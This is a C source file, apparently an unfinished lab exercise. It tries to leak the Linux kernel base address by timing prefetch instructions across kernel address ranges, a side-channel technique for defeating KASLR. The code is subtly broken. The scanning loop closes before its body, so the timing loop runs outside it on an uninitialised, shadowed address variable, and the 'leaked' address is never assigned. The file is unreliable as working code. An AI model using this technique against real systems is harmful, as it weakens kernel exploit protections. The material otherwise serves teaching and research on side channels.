#include <assert.h>
#include <stdio.h>
#include <ctype.h>
#include <string.h>
#include <stdlib.h>
#include <stdint.h>
#include <limits.h>

#include "utils.h"

#define KERNEL_RANGE_START 0xffffffff80000000
#define KERNEL_RANGE_STOP  0xfffffffff0000000
#define STEP_SIZE          0x0000000000200000

uint64_t THRESHOLD = 150;


_Bool is_kpti_enabled() {
  char fname[] = "/sys/devices/system/cpu/vulnerabilities/meltdown";
  FILE* fd = fopen(fname, "r");
  if (fd == NULL) {
    printf("Couldn't open %s. Aborting!\n", fname);
    exit(0);
  }

  fseek(fd, 0, SEEK_END);
  size_t file_size = ftell(fd);
  fseek(fd, 0, SEEK_SET);

  char* file_content = malloc(file_size + 1);
  fread(file_content, 1, file_size, fd);
  file_content[file_size] = '\0';

  _Bool kpti_enabled = strstr(file_content, "PTI") != NULL;
  fclose(fd);
  free(file_content);
  return kpti_enabled;
}

uint64_t rdtsc() {
  uint64_t a, d = 0;

  asm volatile("mfence");
  asm volatile("rdtsc" : "=a"(a), "=d"(d));
  asm volatile("mfence");

  a = (d << 32) | a;
  return a;
}

void prefetch(void *p) {
  asm volatile("prefetcht0 (%0)\n" : : "c"(p));
}

void mfence() {
  asm volatile ("mfence" ::: "memory");
}

void lfence() {
  asm volatile("lfence" ::: "memory");
}

int main(int argc, char* argv[]) {


int deltas[100];
uint64_t current_guess;
  uint64_t curr_best = -1;
  uint64_t curr_best_addr = -1;
  for (uint64_t current_guess = KERNEL_RANGE_START;
       current_guess < KERNEL_RANGE_STOP; current_guess += STEP_SIZE) {
    uint64_t delta_avg = 0; 
    int deltas[100];
    
    
    
}
    
    for (size_t iterations = 0; iterations < 100; iterations++) {
		
    uint64_t start_time = rdtsc();
    
    prefetch((void *)current_guess);
    mfence(); // Ensure the prefetch operation completes before measuring time
    uint64_t end_time = rdtsc();
    deltas[iterations] = end_time - start_time;
		
      // TODO: - iterate over the potential kernel pages and measure the timing of prefetch
    }

    // TODO:  - keep track of the first good candidate (curr_best_addr)
    // HINT: - It can be helpful to only take the first candidate of multiple good looking ones
  

  printf("\033[92m[!] Your leaked address: 0x%zx\033[0m\n", curr_best_addr);

  uint64_t startup_addr = lookup_kallsym("startup_64");
  printf("\033[93m[*] Kernel symbol 'startup_64' at 0x%zx\033[0m\n", startup_addr);
  int64_t offset = startup_addr - curr_best_addr;
  printf("\033[93m[*] TEST: Offset to startup_64: %c0x%llx\033[0m\n", offset < 0 ? '-' : ' ', llabs(offset));
  return 0;
}






